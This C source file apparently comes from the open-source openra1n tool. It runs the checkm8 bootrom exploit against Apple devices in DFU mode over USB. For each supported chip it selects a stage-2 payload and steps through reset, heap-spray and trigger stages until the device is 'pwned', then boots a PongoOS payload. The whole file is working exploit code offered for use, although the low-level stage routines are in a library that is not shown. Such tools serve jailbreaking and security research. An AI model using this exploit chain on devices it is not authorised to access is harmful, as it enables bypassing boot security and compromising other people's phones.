/* Copyright 2023 Mineek
 * Some code from gaster - Copyright 2023 0x7ff
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <stdint.h>
#include <stdlib.h>
#include <stdbool.h>
#include <inttypes.h>
#include <openra1n.h>
#include <common.h>

#include <common/log.h>

#include <payloads/s8000.bin.h>
#include <payloads/s8001.bin.h>
#include <payloads/s8003.bin.h>
#include <payloads/t7000.bin.h>
#include <payloads/t7001.bin.h>
#include <payloads/t8010.bin.h>
#include <payloads/t8011.bin.h>
#include <payloads/t8012.bin.h>
#include <payloads/t8015.bin.h>

#include <payloads/Pongo.bin.h>

extern uint8_t payloads_s8000_bin[], payloads_s8001_bin[], payloads_s8003_bin[], payloads_t7000_bin[], payloads_t7001_bin[], payloads_t8010_bin[], payloads_t8011_bin[], payloads_t8012_bin[], payloads_t8015_bin[];
extern unsigned payloads_s8000_bin_len, payloads_s8001_bin_len, payloads_s8003_bin_len, payloads_t7000_bin_len, payloads_t7001_bin_len, payloads_t8010_bin_len, payloads_t8011_bin_len, payloads_t8012_bin_len, payloads_t8015_bin_len;

extern uint8_t payloads_Pongo_bin[];
extern unsigned payloads_Pongo_bin_len;

#define APPLE_VID (0x5AC)
#define DFU_MODE_PID (0x1227)

bool checkm8(usb_handle_t *handle);

int main(int argc, char **argv)
{
    LOG_RAINBOW("-=-=- openra1n -=-=-");
    int ret = EXIT_FAILURE;
    usb_handle_t* handle = openra1n_init_usb_handle(APPLE_VID, DFU_MODE_PID);
    openra1n_set_usb_timeout(5);
    openra1n_set_usb_abort_timeout_min(0);
    LOG_INFO("Waiting for DFU mode device");
    checkm8(handle);
    openra1n_sleep_ms(3000);
    openra1n_boot_pongo(handle, payloads_Pongo_bin, payloads_Pongo_bin_len);
    openra1n_close_usb_handle(handle);
    openra1n_free_handle(handle);
    return ret;
}

bool checkm8(usb_handle_t *handle)
{
    enum
    {
        STAGE_RESET,
        STAGE_SETUP,
        STAGE_SPRAY,
        STAGE_PATCH,
        STAGE_PWNED
    } stage = STAGE_RESET;
    bool ret, pwned;
    int cpid;
    void *checkra1n_payload = NULL;
    size_t checkra1n_payload_sz = 0;

    while (stage != STAGE_PWNED && (cpid = openra1n_wait_usb_handle(handle, &pwned)))
    {
        switch (cpid)
        {
        case 0x8000:
            LOG_DEBUG("setting up stage 2 for s8000");
            checkra1n_payload = payloads_s8000_bin;
            checkra1n_payload_sz = payloads_s8000_bin_len;
            break;

        case 0x8001:
            LOG_DEBUG("setting up stage 2 for s8001");
            checkra1n_payload = payloads_s8001_bin;
            checkra1n_payload_sz = payloads_s8001_bin_len;
            break;

        case 0x8003:
            LOG_DEBUG("setting up stage 2 for s8003");
            checkra1n_payload = payloads_s8003_bin;
            checkra1n_payload_sz = payloads_s8003_bin_len;
            break;

        case 0x7000:
            LOG_DEBUG("setting up stage 2 for t7000");
            checkra1n_payload = payloads_t7000_bin;
            checkra1n_payload_sz = payloads_t7000_bin_len;
            break;

        case 0x7001:
            LOG_DEBUG("setting up stage 2 for t7001");
            checkra1n_payload = payloads_t7001_bin;
            checkra1n_payload_sz = payloads_t7001_bin_len;
            break;

        case 0x8010:
            LOG_DEBUG("setting up stage 2 for t8010");
            checkra1n_payload = payloads_t8010_bin;
            checkra1n_payload_sz = payloads_t8010_bin_len;
            break;

        case 0x8011:
            LOG_DEBUG("setting up stage 2 for t8011");
            checkra1n_payload = payloads_t8011_bin;
            checkra1n_payload_sz = payloads_t8011_bin_len;
            break;

        case 0x8012:
            LOG_DEBUG("setting up stage 2 for t8012");
            checkra1n_payload = payloads_t8012_bin;
            checkra1n_payload_sz = payloads_t8012_bin_len;
            break;

        case 0x8015:
            LOG_DEBUG("setting up stage 2 for t8015");
            checkra1n_payload = payloads_t8015_bin;
            checkra1n_payload_sz = payloads_t8015_bin_len;
            break;

        default:
            LOG_ERROR("unsupported cpid 0x%" PRIX32 "", cpid);
            return false;
        }

        if (!pwned)
        {
            if (stage == STAGE_RESET)
            {
                ret = openra1n_stage_reset(handle);
                stage = STAGE_SETUP;
            }
            else if (stage == STAGE_SETUP)
            {
                LOG_INFO("Setting up the exploit (this is the heap spray)");
                ret = openra1n_stage_setup(handle);
                stage = STAGE_SPRAY;
            }
            else if (stage == STAGE_SPRAY)
            {
                ret = openra1n_stage_spray(handle);
                stage = STAGE_PATCH;
            }
            else
            {
                LOG_INFO("Right before trigger (this is the real bug setup)");
                ret = openra1n_stage_patch(handle, checkra1n_payload, checkra1n_payload_sz);
                stage = STAGE_RESET;
            }
            if (ret)
            {
                LOG_DEBUG("Stage %d succeeded", stage);
            }
            else
            {
                LOG_ERROR("Stage %d failed", stage);
                stage = STAGE_RESET;
            }
            openra1n_reset_usb_handle(handle);
        }
        else
        {
            stage = STAGE_PWNED;
        }
        openra1n_close_usb_handle(handle);
    }
    return stage == STAGE_PWNED;
}
